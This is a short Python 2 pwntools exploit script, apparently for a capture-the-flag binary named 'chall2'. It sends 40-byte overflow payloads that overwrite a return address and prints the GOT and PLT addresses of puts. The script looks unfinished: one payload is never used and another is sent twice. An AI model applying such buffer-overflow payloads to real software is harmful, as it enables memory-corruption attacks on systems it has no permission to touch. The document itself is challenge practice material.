from pwn import *

payload1 = 'A'*40+'\x17'
payload2 = 'A'*40+p64(0x601100)
elf = ELF('./chall2')
p = process('./chall2')
print hex(elf.got['puts'])
print hex(elf.plt['puts'])
print p.recv()
p.sendline(payload1)
print p.recvline()
print p.recvline()
p.sendline('A'*40+'\x17')
